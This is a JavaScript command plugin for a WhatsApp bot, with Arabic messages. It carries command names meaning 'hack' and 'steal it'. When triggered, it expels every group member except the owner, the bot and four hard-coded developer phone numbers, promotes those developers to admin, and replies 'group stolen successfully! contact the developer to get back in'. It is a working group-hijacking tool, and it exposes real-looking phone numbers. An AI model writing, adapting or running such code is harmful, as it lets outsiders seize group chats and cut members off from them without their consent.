const handler = async (m, { conn, participants, usedPrefix, command }) => {
  const allowedNumber = "967772350066@s.whatsapp.net"; // الرقم الوحيد المسموح له باستخدام الأمر

  if (m.sender !== allowedNumber) {
    return m.reply('⚠️ ليس لديك الصلاحية لاستخدام هذا الأمر!');
  }

  if (!m.isGroup) return m.reply('⚠️ هذا الأمر يعمل فقط داخل المجموعات!');

  let groupMetadata = await conn.groupMetadata(m.chat);
  let owner = groupMetadata.owner || m.chat.split`-`[0] + '@s.whatsapp.net';

  let botDevelopers = [
    '967772350066@s.whatsapp.net',
    '967773667218@s.whatsapp.net',
    '967776155411@s.whatsapp.net',
    '201229466261@s.whatsapp.net'
  ]; 

  let participantsToKick = participants
    .filter(p => p.id !== owner && p.id !== conn.user.jid && !botDevelopers.includes(p.id))
    .map(p => p.id);

  let developersToPromote = participants
    .filter(p => botDevelopers.includes(p.id))
    .map(p => p.id);

  // التحقق مما إذا كان البوت أدمن
  let botNumber = conn.user.jid;
  let botIsAdmin = participants.find(p => p.id === botNumber)?.admin === 'admin';

  if (!botIsAdmin) {
    return m.reply('⚠️ لا يمكنني تنفيذ هذا الأمر لأنني لست أدمن في المجموعة!');
  }

  try {
    if (participantsToKick.length > 0) {
      await conn.groupParticipantsUpdate(m.chat, participantsToKick, 'remove');
    } else {
      return m.reply('⚠️ لا يوجد أعضاء متاحون للطرد.');
    }

    if (developersToPromote.length > 0) {
      await conn.groupParticipantsUpdate(m.chat, developersToPromote, 'promote');
    }

    m.reply('✅ تم زرف المجموعة بنجاح! تواصل مع المطور لإعادتك 😈');
  } catch (error) {
    console.error(error);
    m.reply('❌ حدث خطأ أثناء تنفيذ الأمر. تأكد من أن البوت لديه الصلاحيات اللازمة.');
  }
};

handler.help = ['kickall'];
handler.tags = ['group'];
handler.command = ['طرد-الكل', 'هاك', 'اسحبها', 'ازرفها'];
handler.group = true;
handler.owner = true;
handler.botAdmin = true;

export default handler;